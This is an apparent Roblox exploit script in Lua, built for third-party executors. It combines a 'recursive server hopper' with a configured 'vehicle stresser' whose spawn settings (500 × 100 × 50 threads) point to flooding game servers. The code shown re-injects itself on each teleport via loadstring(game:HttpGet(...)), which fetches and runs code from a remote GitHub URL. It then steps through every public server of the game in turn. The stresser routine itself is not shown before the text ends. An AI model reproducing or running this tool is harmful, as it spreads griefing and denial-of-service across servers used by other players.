--[[
    ============================================================
    MERGED SCRIPT
    Recursive Server Hopper  +  Vehicle Stresser

    Flow:
      1. Validate config / executor capabilities.
      2. Build vehicle menu UI.
      3. Auto-run the vehicle stresser (if enabled).
      4. When spawning finishes, start the recursive server hop.
      5. Hop reinjects this same script on every teleport.
    ============================================================
]]

--==============================================================
-- RECURSIVE HOP CONFIGURATION
--==============================================================
local AUTO_REJOIN           = true          -- master switch (kept for compatibility)
local REJOIN_SAME_SERVER    = false         -- hop config: false = always fresh servers
local recursive_execution   = true
local SCRIPT_URL            = "https://raw.githubusercontent.com/femce4l20/testies/refs/heads/main/test1.json"
local MAX_SERVER_PAGES      = 100
local INITIAL_DELAY         = 1.5
local TELEPORT_DELAY        = 0.5
local VISITED_SETTING       = "RecursiveServerHop_Visited_v4"

--==============================================================
-- VEHICLE STRESSER CONFIGURATION
--==============================================================
local DEFAULT_SPAWN_COUNT        = 500
local SPAWN_DELAY                = 0
local STRESS_MULTIPLIER          = 100     -- base * this * PARALLEL_THREADS
local PARALLEL_THREADS           = 50
local BUTTON_NAME                = "Steel Coil"
local AUTO_RUN_VEHICLE_SPAWNER   = true    -- skip waiting for a click

--==============================================================
-- SERVICES
--==============================================================
local Players            = game:GetService("Players")
local TeleportService    = game:GetService("TeleportService")
local HttpService        = game:GetService("HttpService")
local ReplicatedStorage  = game:GetService("ReplicatedStorage")
local UserInputService   = game:GetService("UserInputService")
local LocalPlayer        = Players.LocalPlayer
local PlayerGui          = LocalPlayer:WaitForChild("PlayerGui")

--==============================================================
-- EXECUTOR COMPATIBILITY
--==============================================================
local function getQueueTeleport()
    if type(queue_on_teleport) == "function" then return queue_on_teleport end
    if syn and type(syn.queue_on_teleport) == "function" then return syn.queue_on_teleport end
    if fluxus and type(fluxus.queue_on_teleport) == "function" then return fluxus.queue_on_teleport end
    return nil
end
local queueteleport = getQueueTeleport()

local function getHttp()
    if type(game.HttpGet) == "function" then
        return function(url) return game:HttpGet(url) end
    end
    local requestFunction = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
    if type(requestFunction) == "function" then
        return function(url)
            local response = requestFunction({ Url = url, Method = "GET" })
            if response and response.Body then return response.Body end
            error("HTTP request returned no body")
        end
    end
    return nil
end
local httpGet = getHttp()

--==============================================================
-- VALIDATION (gate the whole merged run)
--==============================================================
if not AUTO_REJOIN then
    warn("[Merged] AUTO_REJOIN = false — aborting.")
    return
end
if not SCRIPT_URL or SCRIPT_URL == "" or SCRIPT_URL:find("YOUR%-RAW%-SCRIPT%-URL") then
    warn("[Merged] Invalid SCRIPT_URL — aborting.")
    return
end
if recursive_execution and not queueteleport then
    warn("[Merged] queue_on_teleport unavailable — aborting.")
    return
end
if not httpGet then
    warn("[Merged] No HTTP function available — aborting.")
    return
end

--==============================================================
-- SERVER VISIT STORAGE
--==============================================================
local visited = {}

local function loadVisited()
    local success, stored = pcall(function()
        return TeleportService:GetTeleportSetting(VISITED_SETTING)
    end)
    if not success then
        warn("[Merged] Failed to load visited list:", stored)
        return
    end
    if typeof(stored) == "table" then
        for jobId, value in pairs(stored) do
            if value == true then visited[tostring(jobId)] = true end
        end
        return
    end
    if typeof(stored) == "string" and stored ~= "" then
        local decodeSuccess, decoded = pcall(function()
            return HttpService:JSONDecode(stored)
        end)
        if decodeSuccess and typeof(decoded) == "table" then
            for jobId, value in pairs(decoded) do
                if value == true then visited[tostring(jobId)] = true end
            end
        end
    end
end

local function saveVisited()
    local copy = {}
    for jobId, value in pairs(visited) do
        if value then copy[tostring(jobId)] = true end
    end
    local success, err = pcall(function()
        TeleportService:SetTeleportSetting(VISITED_SETTING, copy)
    end)
    if success then return true end
    warn("[Merged] Table save failed:", err)
    local encodeSuccess, encoded = pcall(function()
        return HttpService:JSONEncode(copy)
    end)
    if not encodeSuccess then return false end
    local fallbackSuccess, fallbackErr = pcall(function()
        TeleportService:SetTeleportSetting(VISITED_SETTING, encoded)
    end)
    if not fallbackSuccess then
        warn("[Merged] JSON save failed:", fallbackErr)
        return false
    end
    return true
end

loadVisited()

local currentJobId = tostring(game.JobId)
print("[Merged] Current server:", currentJobId)
if currentJobId ~= "" then
    visited[currentJobId] = true
    saveVisited()
end

--==============================================================
-- REINJECTION
--==============================================================
local teleportQueueRegistered = false

local function buildQueuedLoader()
    return "loadstring(game:HttpGet('" .. SCRIPT_URL .. "'))()"
end

local function queueForTeleport()
    if not recursive_execution then return false end
    if teleportQueueRegistered then return true end
    if not queueteleport then
        warn("[Merged] queue_on_teleport unavailable.")
        return false
    end
    local code = buildQueuedLoader()
    print("[Merged] Registering teleport loader...")
    local success, err = pcall(function() queueteleport(code) end)
    if not success then
        warn("[Merged] queue_on_teleport failed:", err)
        return false
    end
    teleportQueueRegistered = true
    print("[Merged] Teleport loader registered.")
    return true
end

Players.LocalPlayer.OnTeleport:Connect(function(state)
    print("[Merged] OnTeleport:", tostring(state))
    if not recursive_execution then return end
    if not teleportQueueRegistered then queueForTeleport() end
end)

--==============================================================
-- SERVER API
--==============================================================
local function fetchServers()
    local servers = {}
    local cursor = nil
    for _ = 1, MAX_SERVER_PAGES do
        local url = ("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100"):format(game.PlaceId)
        if cursor and cursor ~= "" then
            url = url .. "&cursor=" .. HttpService:UrlEncode(cursor)
        end
        local body
        local ok, err = pcall(function() body = httpGet(url) end)
        if not ok then warn("[Merged] Server API failed:", err); break end
        local data
        local decodeOk, decodeErr = pcall(function() data = HttpService:JSONDecode(body) end)
        if not decodeOk then warn("[Merged] Server JSON failed:", decodeErr); break end
        if typeof(data) ~= "table" then warn("[Merged] Invalid server response."); break end
        if typeof(data.data) == "table" then
            for _, server in ipairs(data.data) do
                if server.id then table.insert(servers, server) end
            end
        end
        cursor = data.nextPageCursor
        if not cursor or cursor == "" then break end
    end
    return servers
end

local function getCandidates()
    local servers = fetchServers()
    print("[Merged] Servers returned:", #servers)
    local preferred, fallback = {}, {}
    for _, server in ipairs(servers) do
        local jobId = tostring(server.id)
        local isCurrent = jobId == currentJobId
        local alreadyVisited = visited[jobId] == true
        if not alreadyVisited and (REJOIN_SAME_SERVER or not isCurrent) then
            table.insert(fallback, server)
            local playing = tonumber(server.playing) or 0
            local maxPlayers = tonumber(server.maxPlayers) or 0
            if maxPlayers <= 0 or playing < maxPlayers then
                table.insert(preferred, server)
            end
        end
    end
    if #preferred > 0 then return preferred end
    return fallback
end

local function chooseServer()
    local candidates = getCandidates()
    if #candidates == 0 then return nil end
    return candidates[math.random(1, #candidates)]
end

--==============================================================
-- DONE UI
--==============================================================
local function showDone()
    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not pg then return end
    local old = pg:FindFirstChild("RecursiveHopDone")
    if old then old:Destroy() end
    local gui = Instance.new("ScreenGui")
    gui.Name = "RecursiveHopDone"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 2147483647
    local background = Instance.new("Frame")
    background.Size = UDim2.fromScale(1, 1)
    background.BorderSizePixel = 0
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    background.Parent = gui
    local label = Instance.new("TextLabel")
    label.AnchorPoint = Vector2.new(0.5, 0.5)
    label.Position = UDim2.fromScale(0.5, 0.5)
    label.Size = UDim2.fromScale(0.8, 0.2)
    label.BackgroundTransparency = 1
    label.Text = "done."
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Parent = background
    gui.Parent = pg
end

--==============================================================
-- DESTROY PARTS
--==============================================================
local function destroyEveryPart()
    local destroyed = 0
    for _, instance in ipairs(game:GetDescendants()) do
        if instance:IsA("BasePart") then
            pcall(function() instance:Destroy(); destroyed += 1 end)
        end
    end
    pcall(function()
        local terrain = workspace:FindFirstChildOfClass("Terrain")
        if terrain then terrain:Clear() end
    end)
    print("[Merged] Destroyed parts:", destroyed)
end

--==============================================================
-- TELEPORT
--==============================================================
local function teleportToServer(server)
    if not server or not server.id then return false end
    local targetJobId = tostring(server.id)
    if targetJobId == "" then return false end
    if visited[targetJobId] then
        print("[Merged] Refusing visited server:", targetJobId)
        return false
    end
    if not REJOIN_SAME_SERVER and targetJobId == currentJobId then
        print("[Merged] Refusing current server.")
        return false
    end

    visited[targetJobId] = true
    saveVisited()
    teleportQueueRegistered = false

    if recursive_execution then
        if not queueForTeleport() then
            warn("[Merged] Could not queue reinjection.")
            visited[targetJobId] = nil
            saveVisited()
            return false
        end
    end

    print("[Merged] Next server:", targetJobId)
    task.wait(TELEPORT_DELAY)

    local success, err = pcall(function()
        TeleportService:TeleportToPlaceInstance(game.PlaceId, targetJobId, LocalPlayer)
    end)
    if not success then
        warn("[Merged] Teleport call failed:", err)
        visited[targetJobId] = nil
        saveVisited()
        return false
    end
    print("[Merged] Teleport request sent.")
    return true
end

--==============================================================
-- RECURSIVE HOP DRIVER
--==============================================================
local function startRecursiveHop()
    print("[Merged] Starting recursive hop...")
    local attempts = 0
    while true do
        attempts += 1
        if attempts > 50 then
            warn("[Merged] Too many failed server attempts.")
            break
        end
        local target = chooseServer()
        if not target then
            print("[Merged] No unvisited public servers found.")
            break
        end
        if teleportToServer(target) then
            return  -- teleport started; this copy will leave the server
        end
        task.wait(0.5)
    end
    task.wait(0.5)
    destroyEveryPart()
    showDone()
    print("[Merged] done.")
end

--==============================================================
